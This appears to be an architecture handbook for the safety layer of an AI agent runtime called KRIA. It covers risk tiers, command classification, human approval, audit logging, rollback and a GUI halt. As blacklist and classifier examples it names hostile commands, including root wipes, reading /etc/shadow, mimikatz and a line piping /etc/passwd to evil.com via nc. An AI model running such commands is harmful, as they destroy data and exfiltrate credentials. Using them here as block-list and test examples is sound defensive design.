# KRIA Safety, Policy, and HITL Architecture

Production architecture handbook for KRIA's safety authority layer.

This document explains how KRIA decides what can run automatically, what must pause for
human approval, what must be blocked, how decisions are audited, and how GUI automation
can be halted when the runtime is unsafe.

Updated against the current KRIA working tree on 2026-05-27.

## Reader Contract

This handbook is written for readers who need both intuition and implementation detail:

- **Plain-language safety model first:** GREEN/YELLOW/RED/BLACK are explained as human
  risk concepts before source-level mechanics.
- **Current implementation is source-backed:** Sections 1-18 describe the behavior in the
  current safety, HITL, audit, rollback, and halt code.
- **Future work is separate:** improvements are collected in **Section 19. Hardening
  Roadmap**.
- **Runtime authority is explicit:** the LLM may propose an action, but `PolicyEngine`,
  `HitlGateway`, `AuditLogger`, isolation, and verifiers decide what actually happens.
- **Source truth:** if this document and code disagree, the code is authoritative and the
  document should be corrected.

It is a companion to:

- `docs/architecture/core-runtime.md`
- `docs/architecture/llm-orchestrator-runtime.md`
- `docs/architecture/gui-cognition-runtime.md`
- `docs/reference/source-navigation.md`

---

## 1. Executive Overview

KRIA's safety layer exists because model output is not execution authority. The LLM can
suggest a tool call, but the runtime decides whether that tool can run.

```text
LLM / planner proposes action
        |
        v
Tool availability gate
        |
        v
ExecutionGate
        |
        +-- readiness check
        +-- parameter preflight
        +-- execution-authority target check
        +-- durable ActionProposal with action/target hashes
        +-- resource requirements
        |
        v
PolicyEngine
        |
        +-- GREEN  -> execute automatically
        +-- YELLOW -> execute and notify/trace
        +-- RED    -> require HITL approval
        +-- BLACK  -> block
        |
        v
AuditLogger records decision
        |
        v
DecisionStore + HITL if required
        |
        v
run_isolated tool execution
        |
        v
verification / synthesis / recovery
```

The safety layer is intentionally independent from prompt text. A prompt can instruct
the model to be careful, but only the runtime can enforce safety.

### Safety Subsystem Contract

The safety subsystem enforces deterministic execution governance for all side-effecting actions.

Responsibilities:
- Evaluate risk for tool and command executions.
- Validate tool readiness, parameters, target authority, action hashes, target hashes, and resource requirements before side effects.
- Enforce deny, allow, or approve behavior through policy tiers.
- Collect human approvals where required.
- Record durable safety audit trails.

Non-goals:
- Safety does not replace orchestration routing decisions.
- Safety does not create autonomous policy exceptions at runtime.

Authority boundaries:
- Orchestrator initiates actions; safety can block or require confirmation.
- Substrates such as OpenClaw, MCP, shell, n8n, GUI, browser, and voice cannot bypass safety.
- Provider output cannot force unsafe execution.
- HITL timeout defaults to denial.
- Durable decisions are valid only for the exact action proposal and target hash they were created for.
- Audit persistence failure must be surfaced for high-risk paths.

Primary files:

| System | File |
| ------ | ---- |
| Tool policy | `crates/kria-core/src/safety/policy.rs` |
| Command classifier | `crates/kria-core/src/safety/command_classifier.rs` |
| Capability policy gate | `crates/kria-core/src/safety/policy_gate.rs` |
| Execution gate | `crates/kria-core/src/agent/execution_gate.rs` |
| Durable decisions | `crates/kria-core/src/agent/collaborative_decision.rs` |
| Resource leases | `crates/kria-core/src/agent/resource_lease.rs` |
| Human approval | `crates/kria-core/src/safety/hitl.rs` |
| Audit log | `crates/kria-core/src/safety/audit.rs` |
| Rollback snapshots | `crates/kria-core/src/safety/rollback.rs` |
| Global GUI halt | `crates/kria-core/src/safety/global_halt.rs` |
| Hard blacklist | `crates/kria-core/src/safety/blacklist.rs` |
| Agent call site | `crates/kria-core/src/agent/loop_engine/mod.rs` |
| GUI call site | `crates/kria-core/src/agent/gui_wiring.rs` |

---

## 2. Safety Philosophy

KRIA follows bounded operational safety:

- the LLM does not decide risk,
- unknown tools fail closed to RED,
- hard-blacklisted patterns cannot be overridden,
- dangerous actions require human approval,
- denied or timed-out approvals do not execute,
- audit happens before execution,
- GUI automation can be globally halted,
- visible success must be verified before being claimed.

### Authority Model

```text
User intent
  |
  v
Routing / planning
  |
  v
LLM proposal
  |
  v
Runtime authority
  |
  +-- tool visibility
  +-- policy
  +-- HITL
  +-- audit
  +-- isolation
  +-- verification
```

The LLM is useful for understanding and planning. It is not trusted to police itself.

### Fail-Closed Defaults

The policy layer intentionally treats unknown actions conservatively:

```text
Known safe tool      -> GREEN
Known reversible     -> YELLOW
Known dangerous      -> RED
Hard forbidden       -> BLACK
Unknown              -> RED
```

This means new tools must be deliberately classified before they behave smoothly in
production.

---

## 3. Safety Runtime Architecture

```text
+----------------------+
| AgentLoop / GUI path |
+----------+-----------+
           |
           v
+----------------------+
| ExecutionGate        |
| agent/execution_gate |
+----------+-----------+
           |
   +-------+--------+-------------------+
   |                |                   |
   v                v                   v
Preflight      ExecutionAuthority   ActionProposal
tools/...      agent/...            DecisionStore
   |                |                   |
   +-------+--------+-------------------+
           |
           v
+----------------------+
| PolicyEngine         |
| safety/policy.rs     |
+----------+-----------+
           |
   +-------+--------+----------------+
   |                |                |
   v                v                v
Blacklist     CommandClassifier  Tool tier sets
blacklist.rs  command_classifier policy.rs
   |                |                |
   +-------+--------+----------------+
           |
           v
   PolicyDecision
           |
   +-------+--------+
   |                |
   v                v
AuditLogger      HitlGateway
audit.rs         hitl.rs
   |                |
   +-------+--------+
           |
           v
run_isolated / tool handler
```

### Main Call Sites

In the agent loop, every tool call eventually passes through:

```text
PolicyEngine.evaluate_with_modality_hint(...)
```

Important call sites:

- `crates/kria-core/src/agent/loop_engine/mod.rs`
- `crates/kria-core/src/agent/gui_wiring.rs`

The GUI path has its own policy/HITL wiring because GUI workflows can issue lower-level
automation actions, but the same safety principles apply.

In the current GUI path, `PolicyToolExecutor` calls:

```text
ExecutionGate::evaluate(...)
  -> readiness / preflight / execution authority
  -> ActionProposal(action_hash, target_hash)
  -> PolicyEngine.evaluate_with_modality_hint(...)
  -> DecisionStore/HITL when approval or clarification is required
  -> resource lease acquisition
  -> ToolRegistry handler
```

This makes approval resumability and stale-decision rejection explicit instead of relying only on transient HITL prompts.

---

## 4. Risk Levels

`RiskLevel` is defined in `crates/kria-core/src/safety/policy.rs`.

| Tier | Runtime Behavior | Typical Examples |
| ---- | ---------------- | ---------------- |
| GREEN | auto-execute | read file, list apps, web search, screenshot, read Gmail |
| YELLOW | execute and notify/trace | write file, create doc, set volume, move window |
| RED | require HITL approval | delete file, install package, execute shell, send Gmail |
| BLACK | always block | root filesystem wipe, credential theft, firewall disable patterns |

```text
PolicyDecision {
  risk_level,
  action,
  requires_approval,
  blocked,
  reason,
  escalated_from
}
```

### GREEN

GREEN actions are read-only or trivially reversible. They do not require approval.

Examples from `GREEN_ACTIONS`:

- `read_file`
- `list_directory`
- `web_search`
- `fetch_webpage`
- `get_active_window`
- `screenshot`
- `gw_gmail_read`
- `gw_drive_search`

### YELLOW

YELLOW actions modify user-level state but are intended to be reversible or low-risk.
They do not require HITL by default, but they should be visible in runtime traces.

Examples from `YELLOW_ACTIONS`:

- `write_file`
- `create_directory`
- `set_clipboard`
- `set_volume`
- `generate_image`
- `gw_docs_create`
- `gw_calendar_create`

### RED

RED actions require approval.

Examples from `RED_ACTIONS`:

- `delete_file`
- `delete_directory`
- `install_package`
- `uninstall_package`
- `execute_bash`
- `execute_python`
- `execute_fleet_command`
- `gw_gmail_send`
- `gw_drive_delete`

### BLACK

BLACK actions are blocked without approval. The system does not ask the user to approve
them because they violate hard safety rules.

Examples from `blacklist.rs`:

- `rm -rf /`
- `rm -rf /boot`
- `cat /etc/shadow`
- `mimikatz`
- reverse shell patterns,
- firewall disable patterns,
- destructive disk formatting patterns.

---

## 5. PolicyEngine Runtime Flow

`PolicyEngine::evaluate` runs in this order:

```text
1. Hard blacklist check
   |
   +-- match -> BLACK blocked
   |
2. Shell command classifier for execute_bash / execute_powershell
   |
   +-- command tier result
   |
3. Static tool tier lookup
   |
   +-- GREEN/YELLOW/RED
   |
4. Dynamic MCP Google Workspace inference
   |
5. Unknown action -> RED
   |
6. Protected path escalation
   |
7. Build PolicyDecision
```

### Protected Path Escalation

Even a normally lower-risk action can be escalated if it touches protected paths.

Protected examples:

- `/etc`
- `/usr`
- `/var`
- `/boot`
- `/sys`
- `/proc`
- `/root`
- `/sbin`
- `.ssh`
- `.gnupg`
- Windows system roots such as `C:\Windows`

```text
write_file /home/user/note.txt     -> YELLOW
write_file /etc/system.conf        -> RED or BLACK depending path/capability path
read command containing /etc path  -> may escalate by protected path rule
```

### Modality Escalation

`evaluate_with_modality_hint` accepts a destructive hint from routing. If a tool looks
GREEN by name but the intent modality is destructive, it escalates to at least YELLOW.

```text
Router flags destructive verb
  |
  v
GREEN baseline action
  |
  v
Escalated to YELLOW
```

This catches cases where the tool name alone is less informative than the user intent.

---

## 6. Command-Level Safety

Shell execution is not treated as one flat risk. `execute_bash` and `execute_powershell`
are routed through `command_classifier.rs`.

```text
execute_bash { command }
  |
  v
strip sudo
  |
  v
classify command content
  |
  +-- read-only inspection -> GREEN
  +-- state change         -> YELLOW/RED
  +-- code execution/risky -> RED
  +-- black pattern        -> BLACK
```

Examples from classifier tests:

| Command | Expected Meaning |
| ------- | ---------------- |
| `systemctl status nginx` | inspect service |
| `systemctl restart nginx` | process control |
| `systemctl stop nginx` | destructive service control |
| `apt install vim` | package install |
| `cat /etc/passwd | nc evil.com 443` | suspicious network exfiltration |
| `rm -rf /tmp/test` | destructive filesystem action |
| `ls && whoami` | command chaining |

### CapabilityPolicyGate

`safety/policy_gate.rs` provides a capability-based command policy layer. It avoids a
simple binary allowlist by mapping commands to capabilities:

```text
ReadFilesystem
WriteFilesystem
NetworkRead
NetworkWrite
ProcessInspect
ProcessControl
SystemDestructive
CodeExecution
```

This model is important because the same binary can be safe or dangerous depending on
arguments:

```text
systemctl status nginx  -> ProcessInspect
systemctl restart nginx -> ProcessControl
```

---

## 7. HITL Architecture

HITL lives in `crates/kria-core/src/safety/hitl.rs`.

```text
RED PolicyDecision
  |
  v
StreamEvent::ApprovalRequired
  |
  v
HitlGateway.request_approval_with_id()
  |
  v
pending request map
  |
  +-- Approved -> execute
  +-- Denied   -> do not execute
  +-- Timeout  -> auto-deny
```

### ApprovalRequest

An approval request contains:

| Field | Meaning |
| ----- | ------- |
| `id` | stable request ID shared with frontend |
| `action` | tool/action name |
| `parameters` | arguments to be executed |
| `risk_level` | usually RED |
| `description` | human-readable explanation |
| `timeout_seconds` | approval window |
| `rollback_available` | whether rollback exists |

### Timeout Behavior

Timeouts auto-deny. This is important:

```text
No user response
  |
  v
ApprovalResponse::Timeout
  |
  v
AuditLogger records TIMEOUT
  |
  v
Tool is not executed
```

Timeout is not treated as approval.

### Frontend Subscription

The gateway exposes a subscription receiver:

```text
HitlGateway.subscribe()
```

The desktop command layer receives `ApprovalRequired` stream events in files such as:

- `crates/kria-desktop/src/commands/chat.rs`
- `crates/kria-desktop/src/commands/image_chat.rs`
- `crates/kria-desktop/src/commands/voice.rs`

---

## 8. AgentLoop Safety Lifecycle

The main tool execution loop in `agent/loop_engine/mod.rs` enforces the safety path.

```text
ParsedToolCall
  |
  v
Check allowed_tool_names
  |
  v
GUI-last policy redirect if better tool exists
  |
  v
Tool-specific preflight
  |
  v
PolicyEngine.evaluate_with_modality_hint()
  |
  +-- blocked:
  |       AuditLogger.log(BLOCKED)
  |       ToolEnd(success=false)
  |       inject blocked message into history
  |
  +-- requires approval:
  |       StreamEvent::ApprovalRequired
  |       HitlGateway waits
  |       AuditLogger.log(APPROVED/DENIED/TIMEOUT)
  |       execute only if approved
  |
  +-- allowed:
          AuditLogger.log(AUTO_EXECUTED)
          run_isolated(...)
```

### Denial Injection

When the user denies or the approval times out, KRIA injects a tool message back into
the conversation that explicitly says the tool was not executed.

This prevents the LLM from claiming success after a denied action.

```text
TOOL_ERROR: 'delete_file' was NOT executed - denied by user.
The operation did not happen.
```

### Approval Reuse

The loop can reuse approval for identical tool+args within a turn. That avoids asking
the user twice for the same action while still preserving the original approval decision.

---

## 9. GUI Safety Path

GUI automation has additional risk because it can issue input to arbitrary applications.

Important files:

- `crates/kria-core/src/agent/gui_wiring.rs`
- `crates/kria-core/src/agent/htn_executor.rs`
- `crates/kria-core/src/tools/gui_automation.rs`
- `crates/kria-core/src/safety/global_halt.rs`

### GUI Policy Flow

```text
GUI workflow action
  |
  v
GuiToolExecutor / gui_wiring
  |
  v
PolicyEngine.evaluate_with_modality_hint()
  |
  v
AuditLogger
  |
  v
HITL if required
  |
  v
GUI tool execution
```

### Global Safety Halt

`global_halt.rs` defines a process-wide atomic halt:

```text
GLOBAL_HALT = true
  |
  v
GUI automation tools return GLOBAL_SAFETY_HALT
  |
  v
Workflow continuation classifies infrastructure failure
  |
  v
Runtime explains service/daemon issue instead of continuing blindly
```

The halt can be engaged when:

- user disables GUI automation,
- sidecar/uinput daemon crashes,
- orchestrator detects unsafe automation state,
- emergency shutdown occurs.

It should be released only after required services are confirmed healthy.

---

## 10. Audit Architecture

`AuditLogger` is implemented in `safety/audit.rs` and backed by SQLite.

### What Gets Recorded

| Field | Meaning |
| ----- | ------- |
| `timestamp` | UTC timestamp |
| `session_id` | originating session |
| `action` | tool/action |
| `parameters` | serialized arguments |
| `risk_level` | GREEN/YELLOW/RED/BLACK |
| `decision` | auto-executed, approved, denied, blocked, timeout |
| `decided_by` | policy, GUI user, voice user, timeout, hardcoded |
| `result` | success, failed, rolled back |
| `rollback_id` | optional rollback snapshot |
| `prev_hash` / `row_hash` | hash chain integrity |

### Hash Chain

Each row hashes the previous row:

```text
row_hash = sha256(prev_hash | timestamp | session_id | action | parameters | decision)
```

This does not make the database immutable, but it makes tampering detectable through
`verify_chain()`.

```text
GENESIS
  |
  v
row 1 hash
  |
  v
row 2 hash
  |
  v
row 3 hash
```

### Decisions

`Decision` values:

- `AUTO_EXECUTED`
- `APPROVED`
- `DENIED`
- `BLOCKED`
- `TIMEOUT`

`DecidedBy` values:

- `POLICY`
- `USER_VOICE`
- `USER_GUI`
- `TIMEOUT`
- `HARDCODED`
- `VERIFICATION`

---

## 11. Rollback Architecture

Rollback snapshots live in `safety/rollback.rs`.

Rollback is designed for reversible file safety. It creates snapshot directories with:

```text
{rollback_dir}/{timestamp}/
  manifest.json
  files/
    0_filename
    1_other_file
```

### Manifest

`RollbackManifest` records:

- timestamp,
- session ID,
- action,
- risk level,
- backed-up files,
- SHA-256 hashes,
- rollback command,
- expiry time.

### Lifecycle

```text
Before risky file change
  |
  v
create_snapshot()
  |
  v
execute action
  |
  +-- user/system requests restore
        |
        v
      restore(rollback_id)
```

### Limits

Rollback is not universal. It is strongest for local file backup/restore. It cannot
undo all external side effects, such as sent email, deleted cloud objects, system package
changes, or remote service actions unless those tools implement their own recovery path.

---

## 12. Blacklist And Hard Blocks

`blacklist.rs` contains BLACK tier regex patterns that cannot be overridden.

Categories include:

- disk destruction,
- boot/system integrity damage,
- security disabling,
- system file destruction,
- credential theft,
- reverse shells,
- cryptocurrency mining.

```text
action or parameter string
  |
  v
BlacklistChecker.is_blocked()
  |
  +-- true -> BLACK, blocked, no HITL
  +-- false -> continue policy classification
```

The key design choice: BLACK is not "ask the user". BLACK is "do not run".

---

## 13. OS Intent Capability Safety

`PolicyEngine::classify_capability` handles structured platform capabilities.

Examples:

| Capability | Risk Handling |
| ---------- | ------------- |
| `OpenUrl` | validates URI scheme; blocks permanently unsafe/unknown schemes |
| `LaunchApp` | GREEN for known installed app launch |
| `SendMessage` | YELLOW draft/preview path |
| `FileWrite` | YELLOW unless protected/system root |
| `AxInvoke` | RED, accessibility automation requires explicit confirmation |

This path matters because OS-intent dispatch has more structure than plain tool names.
KRIA can classify a typed capability more accurately than a string command.

---

## 14. Eval Mode

`KRIA_EVAL_MODE` can auto-approve some normally approval-requiring actions during evals.

This is useful for destructive VM tests and red-tier chaos tests, but dangerous to
misread during production debugging.

```text
KRIA_EVAL_MODE set
  |
  v
some RED/YELLOW approvals bypassed for harness
```

Maintainer rule:

> If a dangerous action unexpectedly auto-executed, check whether `KRIA_EVAL_MODE`
> was set before changing policy code.

---

## 15. Failure Modes And Root Causes

### Failure: Tool Bypassed Policy

Expected invariant:

```text
No real tool execution before policy evaluation.
```

Check:

- `agent/loop_engine/mod.rs`
- `agent/gui_wiring.rs`
- any bootstrap/special-case tool path,
- direct handler calls in tests or desktop commands.

KRIA has some special flows, such as Colab bootstrap, that must still perform policy and
audit explicitly.

### Failure: Approval Prompt Appeared But Action Still Ran After Denial

Expected invariant:

```text
Denied or timed-out approval means no execution.
```

Check:

- HITL response mapping,
- deduped approval key,
- audit decision,
- whether execution occurs only in approved branch.

### Failure: Safe-Looking Tool Did Dangerous Work

Root causes:

- tool was mis-tiered,
- parameters carried a protected path,
- command string was opaque to classifier,
- destructive modality hint was missing,
- tool name changed but policy list was not updated.

Fix path:

1. add test reproducing the action,
2. update `policy.rs` tier or path escalation,
3. update `command_classifier.rs` if shell-related,
4. update capability registry if routing contributed,
5. verify audit entry.

### Failure: GUI Automation Continued After Daemon Failure

Expected invariant:

```text
unsafe GUI infrastructure -> GLOBAL_SAFETY_HALT -> no more input events
```

Check:

- `global_halt.rs`,
- `tools/gui_automation.rs`,
- `agent/htn_executor.rs`,
- sidecar/uinput daemon health,
- workflow continuation classification.

### Failure: Audit Log Missing Entry

Expected invariant:

```text
Policy decision should be auditable before execution.
```

Check:

- the action path used `PolicyEngine`,
- `AuditLogger.log` call happened before execution,
- special-case bootstraps did not bypass logging,
- desktop command did not directly call lower-level operation.

---

## 16. Safety Decision Examples

### Example: Read A File

```text
read_file { path: "/home/user/notes.txt" }
  |
  v
GREEN_ACTIONS match
  |
  v
No protected path escalation
  |
  v
Auto-execute + audit
```

### Example: Delete Downloads

```text
delete_directory { path: "/home/user/Downloads" }
  |
  v
RED_ACTIONS match
  |
  v
ApprovalRequired
  |
  +-- Approved -> execute + verify
  +-- Denied/Timeout -> no execution
```

### Example: Write Under `/etc`

```text
write_file { path: "/etc/kria.conf" }
  |
  v
YELLOW base tier
  |
  v
protected path match
  |
  v
Escalated to RED
  |
  v
HITL approval required
```

### Example: Root Wipe Command

```text
execute_bash { command: "rm -rf /" }
  |
  v
Blacklist match
  |
  v
BLACK
  |
  v
Blocked, no approval prompt
```

### Example: Send Gmail

```text
gw_gmail_send
  |
  v
RED_ACTIONS match
  |
  v
ApprovalRequired
  |
  v
Approved only if user explicitly confirms
```

---

## 17. Testing Strategy

Safety tests should validate behavior at multiple levels.

```text
Unit tests
  |
  +-- PolicyEngine tiering
  +-- command classification
  +-- blacklist matches
  +-- protected path escalation
  +-- HITL timeout behavior
  +-- audit hash-chain verification

Integration tests
  |
  +-- AgentLoop tool call path
  +-- ApprovalRequired stream event
  +-- denial prevents execution
  +-- eval mode behavior
  +-- GUI global halt

VM destructive evals
  |
  +-- delete temp files
  +-- package install/uninstall
  +-- red-tier chaos cases
```

Useful locations:

- `crates/kria-core/src/safety/policy.rs` tests
- `crates/kria-core/src/safety/command_classifier.rs` tests
- `crates/kria-core/src/safety/blacklist.rs` tests
- `crates/kria-core/src/safety/global_halt.rs` tests
- generated safety and destructive-VM eval reports under `tests-logs/` when evals are run

---

## 18. Current Maturity Assessment

| Subsystem | Maturity | Notes |
| --------- | -------- | ----- |
| Static tool tiering | Strong | Clear GREEN/YELLOW/RED/BLACK lists |
| Hard blacklist | Strong baseline | Covers obvious catastrophic cases; always expand from incidents |
| Protected path escalation | Strong baseline | Important defense-in-depth |
| Command classifier | Medium-Strong | Better than blanket shell policy; shell remains hard |
| HITL gateway | Strong core | Timeout auto-deny is correct |
| Audit logger | Strong | Hash-chain improves tamper detection |
| Rollback manager | Medium | Good for files; limited for external side effects |
| GUI global halt | Strong concept | Depends on every input path checking it |
| Eval mode | Useful but risky | Must never leak into production assumptions |
| CapabilityPolicyGate | Good direction | Capability model is more scalable than binary allowlists |

---

## 19. Hardening Roadmap

Priority improvements:

| Priority | Improvement | Why |
| -------- | ----------- | --- |
| High | Prove every execution path calls policy | Prevent bypass regressions |
| High | Prove every side-effect path calls `ExecutionGate` before policy/tool execution | Prevent preflight, authority, or decision-store bypass regressions |
| High | Add audit assertions to integration tests | Ensure decisions are recorded |
| High | Expand command classifier cases | Shell is the highest ambiguity surface |
| High | Add policy tests for every new tool | Prevent unclassified behavior |
| High | Wire workflow-contract HITL policy into live GUI completion gates | Prevent visible/account/destructive workflows from silently degrading |
| Medium | Broaden rollback beyond local files | Improve recovery after risky actions |
| Medium | Add UI explanations for escalations | Users should know why approval is needed |
| Medium | Add frontend lifecycle for durable decisions and stale-decision rejection | Makes resumable approvals inspectable and recoverable |
| Medium | Stronger provider/tool provenance in audit | Easier incident reconstruction |
| Low | User-customizable policy profiles | Useful later, but risky before defaults are mature |

What should remain unchanged:

- BLACK actions must never prompt for approval.
- Unknown actions should remain RED by default.
- Approval timeout must deny.
- The LLM must never decide safety.
- Eval auto-approval must remain explicit and visible.

---

## 20. Source Reference Index

| Subsystem | File | Key Types / Functions | Purpose |
| --------- | ---- | --------------------- | ------- |
| Tool policy | `crates/kria-core/src/safety/policy.rs` | `RiskLevel`, `PolicyDecision`, `PolicyEngine`, `evaluate`, `evaluate_with_modality_hint`, `classify_capability` | Main safety tier engine |
| Hard blacklist | `crates/kria-core/src/safety/blacklist.rs` | `BlacklistChecker`, `is_blocked`, `check` | Blocks catastrophic patterns before tiering |
| Command safety | `crates/kria-core/src/safety/command_classifier.rs` | `CommandClassification`, `classify`, `strip_sudo` | Granular shell command risk classification |
| Capability gate | `crates/kria-core/src/safety/policy_gate.rs` | `CommandCapability`, `CapabilityPolicyGate`, `PolicyGate` | Capability-based command policy model |
| HITL | `crates/kria-core/src/safety/hitl.rs` | `HitlGateway`, `ApprovalRequest`, `ApprovalResponse` | Human approval request/response runtime |
| Execution gate | `crates/kria-core/src/agent/execution_gate.rs` | `ExecutionGate`, `ExecutionGateOutcome`, `ResumeGateOutcome` | Central readiness, preflight, authority, policy, decision, and lease gate before side effects |
| Durable decisions | `crates/kria-core/src/agent/collaborative_decision.rs` | `ActionProposal`, `InteractionDecision`, `DecisionStore`, action/target hashes | Persisted approval/clarification/recovery decisions with stale-decision invalidation |
| Resource leases | `crates/kria-core/src/agent/resource_lease.rs` | `ResourceLeaseManager`, `ResourceRequirement`, `ResourceLeaseGuard` | Workflow-bound ownership for filesystem, process, network, browser, and foreground resources |
| Workflow contracts | `crates/kria-core/src/agent/workflow_intent_contract.rs` | `WorkflowIntentContract`, `ContractHitlPolicy`, `ForbiddenDegradation` | Declarative workflow safety and HITL requirements for GUI workflows |
| Verifier authority | `crates/kria-core/src/agent/verifier_authority.rs` | authority and freshness requirement types | Prevents weak/stale evidence from satisfying safety-sensitive visible workflow claims |
| Audit | `crates/kria-core/src/safety/audit.rs` | `AuditLogger`, `Decision`, `DecidedBy`, `verify_chain` | SQLite audit log with hash-chain integrity |
| Rollback | `crates/kria-core/src/safety/rollback.rs` | `RollbackManager`, `RollbackManifest`, `create_snapshot`, `restore` | File rollback snapshots |
| Global halt | `crates/kria-core/src/safety/global_halt.rs` | `engage_halt`, `release_halt`, `check_or_halt`, `halt_reason` | Process-wide GUI automation kill switch |
| Safety exports | `crates/kria-core/src/safety/mod.rs` | re-exports | Public safety module surface |
| Agent call site | `crates/kria-core/src/agent/loop_engine/mod.rs` | `StreamEvent::ApprovalRequired`, policy/HITL execution block | Main tool safety enforcement path |
| GUI call site | `crates/kria-core/src/agent/gui_wiring.rs` | GUI tool executor policy/HITL wiring | GUI-specific safety enforcement |
| Tool isolation | `crates/kria-core/src/infra/isolation.rs` | `run_isolated`, `ToolResult` | Timeout/cancellation around tool handlers |
| Tool preflight | `crates/kria-core/src/tools/preflight.rs` | preflight main entry | Validates parameters before isolation/execution |
| OS intent dispatcher | `crates/kria-core/src/platform/intent/dispatcher.rs` | dispatch errors and policy integration | Structured OS intent policy integration |
| URI safety | `crates/kria-core/src/platform/intent/scheme.rs` | `classify_url`, `SchemeError` | Blocks unsafe URI schemes |

---

## 21. Minimal Mental Model

```text
The model can ask.
The router can suggest.
The tool registry can expose.
But PolicyEngine decides risk.
HITL decides approval.
AuditLogger records authority.
run_isolated executes.
Verifier decides whether success can be claimed.
```

That is the core of KRIA's safety architecture.

---

## Vision Gap Analysis: Safety, Collaboration, And Trust

KRIA's safety layer is one of the strongest parts of the current architecture. It already
has risk tiers, HITL, hard blacklist, protected paths, command classification, audit,
rollback, and global halt. The main gap is not the existence of safety controls; it is
how consistently those controls produce a collaborative coworker experience instead of
only a yes/no gate.

### Current Safety Issues

| Issue | Failure Point | Why It Matters | Implementation Change | Impact |
| ----- | ------------- | -------------- | --------------------- | ------ |
| Safety decisions are not always user-explanatory | Approval prompts can show action/params but not full operational reason | Users need to trust why KRIA paused | Attach policy reason, affected files/accounts, rollback availability, and verifier requirement to approval UI | Better trust, fewer confusing confirmations |
| Tool tiering can drift from new tools | New tool added without correct policy/capability profile | Unsafe or annoying behavior | Add test that every registered tool has explicit policy tier and capability profile | Prevents silent safety regressions |
| Shell remains high ambiguity | `execute_bash` can inspect, modify, or destroy | Shell is necessary for power users but risky | Continue expanding `command_classifier`; add structured command AST where possible | More safe autonomy with fewer unnecessary approvals |
| Rollback is limited | File rollback does not undo cloud sends/deletes/package changes | Human coworker should know what can and cannot be undone | Add per-tool reversibility metadata and show it in HITL | More honest approvals |
| HITL is approval-oriented, not collaboration-oriented | User approves/denies, but recovery choice can be separate | KRIA should ask for help when uncertain, not only dangerous | Add clarification and recovery HITL categories distinct from destructive approval | Better human collaboration |
| Eval mode can mask risk in reports | `KRIA_EVAL_MODE` can auto-approve | Debugging production behavior can be misleading | Surface eval-mode state in test reports and runtime traces | Prevents false confidence |

### Safety Data Flow Upgrade

Current:

```text
Tool call
  -> policy decision
  -> approval if RED
  -> audit
  -> execute
```

Recommended:

```text
Tool call
  |
  v
SafetyEnvelope
  |-- action
  |-- parameters
  |-- risk tier
  |-- destructive modality
  |-- protected targets
  |-- reversibility
  |-- rollback id if available
  |-- verifier requirement
  |-- human explanation
  |
  v
Policy/HITL/Audit
  |
  v
Execution only if authorized
```

### Implementation Priorities

| Priority | Change | Files To Start | Expected Impact |
| -------- | ------ | -------------- | --------------- |
| P0 | Tool policy coverage test for every registered tool | `tools/registry.rs`, `safety/policy.rs`, `crates/kria-core/tests/safety_tests.rs` | No unclassified tool risk |
| P0 | Add terminal audit invariant tests | `safety/audit.rs`, `agent/loop_engine/mod.rs` | Every blocked/approved/executed path is traceable |
| P1 | Introduce `SafetyEnvelope` | `safety/policy.rs`, `agent/loop_engine/mod.rs`, `agent/gui_wiring.rs` | Approval prompts become explainable and consistent |
| P1 | Per-tool reversibility metadata | `tools/registry.rs`, `safety/rollback.rs`, `mcp/capability_registry.rs` | Users know what can be undone |
| P1 | Separate HITL modes: approval, clarification, recovery choice | `safety/hitl.rs`, `agent/workflow_continuation/mod.rs` | More collaborative behavior |
| P2 | Structured shell parser / command AST | `safety/command_classifier.rs`, `safety/policy_gate.rs` | Safer shell autonomy |
| P2 | Runtime safety dashboard | `safety/audit.rs`, desktop commands | Operational transparency for users |

### Desired HITL Experience

For a destructive file request, KRIA should show:

```text
Action: delete_directory
Target: /home/user/Downloads
Risk: RED
Why paused: destructive filesystem operation
Rollback: partial / not available / snapshot prepared
Verifier: confirm target contents removed
Choices: Approve, Deny, Show files first, Narrow scope
```

This is a collaborative safety moment, not a generic permission popup.

### Expected Impact

If these changes are implemented:

- KRIA can act independently on safe work without becoming reckless.
- Users understand why dangerous or ambiguous actions pause.
- Every safety decision becomes inspectable after the fact.
- Tool additions become safer because policy coverage is enforced by tests.
- The assistant feels like a careful coworker, not a nervous chatbot or an unsafe agent.
